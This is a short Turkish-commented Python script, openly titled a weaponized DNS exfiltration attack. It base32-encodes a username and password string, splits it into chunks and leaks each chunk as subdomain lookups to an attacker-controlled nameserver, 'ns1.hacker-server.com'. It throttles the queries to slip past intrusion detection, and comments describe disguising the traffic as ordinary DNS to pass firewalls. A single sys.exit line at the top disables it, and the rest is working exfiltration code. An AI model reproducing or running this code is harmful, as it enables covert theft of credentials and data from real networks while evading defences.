import base64
import time
import socket
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod gerçek bir DNS exfiltration saldırısı yapar.")

print("--- WEAPONIZED DNS EXFILTRATION ---")

# 1. ALTYAPI DEĞİŞİMİ (Weaponized Part)
# Simülasyonda burası "fake.local" idi.
# Gerçekte saldırganın kontrolündeki NS sunucusudur.
C2_DOMAIN = "ns1.hacker-server.com" 

def exfiltrate_data(sensitive_data):
    # Veriyi Base64 ile şifrele (URL Safe)
    encoded_data = base64.b32encode(sensitive_data.encode()).decode()
    
    print(f"[*] Ham Veri: {sensitive_data}")
    print(f"[*] Encoded: {encoded_data}")
    
    # Veriyi parçala (DNS paket boyutu limiti)
    chunk_size = 50
    chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # 2. SORGULARI OLUŞTUR
        # Veriyi subdomain olarak gizle: <VERI>.hacker.com
        hostname = f"{chunk}.{i}.{C2_DOMAIN}"
        
        try:
            print(f"[*] Gönderiliyor: {hostname}")
            # Bu istek Firewall'dan "Domain Sorgusu" olarak çıkar.
            # Ama aslında veriyi saldırgana taşır.
            socket.gethostbyname(hostname)
        except:
            pass
        
        time.sleep(1) # IDS'e yakalanmamak için bekle

if __name__ == "__main__":
    secret = "USER:Admin|PASS:SüperGizliSifre123"
    exfiltrate_data(secret)